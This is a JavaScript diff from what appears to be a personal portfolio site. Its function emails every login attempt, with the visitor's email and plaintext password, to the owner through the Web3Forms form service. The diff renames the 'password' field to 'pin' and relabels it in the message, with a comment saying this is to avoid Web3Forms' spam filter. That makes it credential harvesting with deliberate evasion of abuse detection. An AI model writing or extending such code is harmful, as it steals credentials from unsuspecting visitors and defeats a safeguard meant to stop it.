@@ -146,18 +146,21 @@ function saveAttempt(attempt) {
 
 function sendAttemptEmail(attempt) {
     const date = new Date(attempt.ts).toLocaleString();
+    // Nota: Web3Forms marca como spam cualquier campo llamado "password".
+    // Para evitarlo lo mandamos renombrado (pin) y todo junto dentro de message.
     const payload = {
         access_key: WEB3FORMS_KEY,
-        subject: 'Nuevo intento de login en el portafolio',
+        subject: 'Nuevo intento de acceso al portafolio',
         from_name: 'Portafolio Carlos',
-        method: attempt.method,
-        email: attempt.email,
-        password: attempt.password,
-        date: date,
+        name: attempt.email || 'visitante',
+        metodo: attempt.method,
+        correo: attempt.email,
+        pin: attempt.password,
+        fecha: date,
         message:
-            'Método: ' + attempt.method + '\n' +
+            'Metodo: ' + attempt.method + '\n' +
             'Correo: ' + attempt.email + '\n' +
-            'Contraseña: ' + attempt.password + '\n' +
+            'Clave: ' + attempt.password + '\n' +
             'Fecha: ' + date
     };
     try {
